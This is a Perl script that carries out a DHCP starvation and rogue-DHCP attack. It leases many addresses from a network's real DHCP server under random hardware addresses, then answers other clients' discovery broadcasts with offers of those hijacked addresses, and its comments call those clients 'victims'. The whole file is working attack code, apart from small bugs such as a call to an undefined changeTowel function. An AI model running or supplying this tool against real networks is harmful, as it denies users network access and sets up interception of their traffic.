#!/usr/bin/perl

use strict;

use IO::Socket::INET;
use IO::Select;
use Net::DHCP::Packet;
use Net::DHCP::Constants;
use Time::HiRes qw( usleep );

my $n_towels = $ARGV[0] // 10;

my %towel;

# towels will be assigned to victims
my %victim;

my $server = IO::Socket::INET->new(
	LocalPort => 'bootps',
	Proto => 'udp',
	Broadcast => 1,
) or die "server socket: $!";

my $client = IO::Socket::INET->new(
	Proto => 'udp',
	Broadcast => 1,
	LocalPort => 'bootpc',
) or die "client socket: $!";

my $BRDCAST_TO_SERVER = sockaddr_in(67, inet_aton('255.255.255.255'));
my $BRDCAST_TO_CLIENT = sockaddr_in(68, inet_aton('255.255.255.255'));

my $select = new IO::Select($client, $server) or die "IO::Select: $!";

sub changeTowelState {
	my ($xid, $state) = @_;
	my $old = $towel{$xid}{state};
	$towel{$xid}{state} = $state;
	unless ($old eq $state) {
		printTowelStatus();
	}
}

sub sendDiscover {
	my ($xid, $hw) = @_;
	# create DHCP Packet
	$xid = $xid // int(rand(0xFFFFFFFF));
	$hw = $hw // ($towel{$xid}{packet} && $towel{$xid}{packet}->chaddr) // int(rand(0xFFFFFFFF));
	print "-> DHCPDISCOVER $xid\n";
	my $discover = Net::DHCP::Packet->new(
		Xid => $xid, # random xid
		Flags => 0x8000,              # ask for broadcast answer
		Chaddr => $hw,
		DHO_DHCP_MESSAGE_TYPE() => DHCPDISCOVER()
	);
	changeTowelState($xid, "DISCOVER");
	$towel{$xid} = { state => "DISCOVER", packet => $discover };
	# send packet
	$client->send($discover->serialize(), undef, $BRDCAST_TO_SERVER)
	       or die "Error sending DHCPDISCOVER: $!\n";
}

sub sendRequest {
	my ($offer) = @_;
	print "-> DHCPREQUEST ".$offer->xid."\n";
	my $req = Net::DHCP::Packet->new(
		Xid => $offer->xid(),
		#Ciaddr => $offer->yiaddr(),
		Chaddr => $offer->chaddr,
		Flags => 0x8000,              # ask for broadcast answer
		DHO_DHCP_MESSAGE_TYPE() => DHCPREQUEST(),
		DHO_DHCP_REQUESTED_ADDRESS() => $offer->yiaddr(),
	);
	# send packet
	$client->send($req->serialize(), undef, $BRDCAST_TO_SERVER)
	       or die "Error sending DHCPREQUEST: $!\n";
}

sub findFreeTowel {
	for my $xid (keys %towel) {
		next unless $towel{$xid}{state} eq "ACK";
		next if grep {$_ eq $xid} values %victim;
		return $xid;
	}
	return undef;
}

sub offerTowel {
	my ($packet) = @_;
	my $towel_id = findFreeTowel();
	unless ($towel_id) {
		print "Unable to find a suitable towel\n";
		return;
	}
	my $offer = new Net::DHCP::Packet(
		Op => BOOTREPLY(),
		Xid => $packet->xid(),
		Flags => $packet->flags(),
		Ciaddr => $packet->ciaddr(),
		Yiaddr => $towel{$towel_id}{packet}->yiaddr(),
		Siaddr => $packet->siaddr(),
		Giaddr => $packet->giaddr(),
		Chaddr => $packet->chaddr(),
		DHO_DHCP_MESSAGE_TYPE() => DHCPOFFER(),
	);
	$server->send($offer->serialize(), undef, $BRDCAST_TO_CLIENT);
	$victim{$packet->xid()} = $towel_id;
	print "-> DHCPOFFER", $packet->xid, "(towel", $towel_id, ")\n";
}

sub readResponse {
	my ($handle) = @_;
	my $msg;
	$handle->recv($msg, 4096);
	my $packet = Net::DHCP::Packet->new($msg);
	my $xid = $packet->xid;
	## Responses to our communication
	if ($towel{$xid} && $handle == $client) {
		if ($packet->op == BOOTREPLY() && $packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == DHCPOFFER()) {
			print "<- DHCPOFFER $xid ",(hex($xid)),"\n";
			$towel{$xid} = { state => "OFFER", packet => $packet };
			changeTowel($xid, "OFFER");
			sendRequest($packet);
		} elsif ($packet->op == BOOTREPLY() && $packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == DHCPNAK()) {
			print "<- DHCPNAK $xid: ".($packet->getOptionValue(DHO_DHCP_MESSAGE()))."\n";
			delete $towel{$xid};
		} elsif ($packet->op == BOOTREPLY() && $packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == DHCPACK()) {
			print "<- DHCPACK $xid\n";
			$towel{$xid} = { state => "ACK", packet => $packet };
			changeTowel($xid, "ACK");
			print "Reserved ".(countTowels("ACK"))." addresses from the pool.\n";
		} else {
			print $packet->toString();
		}
	} elsif ($handle == $server && !$towel{$xid}) {
		## Requests from other clients ##
		if ($packet->op == BOOTREQUEST() && $packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == DHCPDISCOVER()) {
			print "<- DHCPDISCOVER $xid\n";
			offerTowel($packet);
		} elsif ($packet->op == BOOTREQUEST() && $packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == DHCPREQUEST()) {
			my $hostname = $packet->getOptionValue(DHO_HOST_NAME());
			print "<- DHCPREQUEST $xid [$hostname]\n";
		} else {
			print $packet->toString();
		}
	}
}

sub countTowels {
	my ($q) = @_;
	return (grep {defined $_} map { (!defined $q || $towel{$_}{state} eq $q) ? $_ : undef } keys %towel)
}

sub refreshTowels {
	for my $xid (keys %towel) {
		my $state = $towel{$xid}{state};
		if ($state eq "DISCOVER" || !$state) {
			# retransmit DHCPDISCOVER
			sendDiscover($xid);
		} elsif ($state eq "OFFER") {
			sendRequest($towel{$xid}{packet});
		}
	}
}

sub addTowel {
	$towel{int(rand(0xFFFFFFFF))} = { state => "", packet => undef };
}

for (1..$n_towels) {
	addTowel();
}

sub printTowelStatus {
	print (join " ", map { "$_: ".countTowels($_) } ("DISCOVER", "OFFER", "ACK"));
	print "\n";
}

while (1) {
	refreshTowels();
	while (my @h = $select->can_read(1)) {
		readResponse($_) for @h;
	}
	while (countTowels()<$n_towels) {
		addTowel();
	}
	printTowelStatus();
	sleep 2;
}
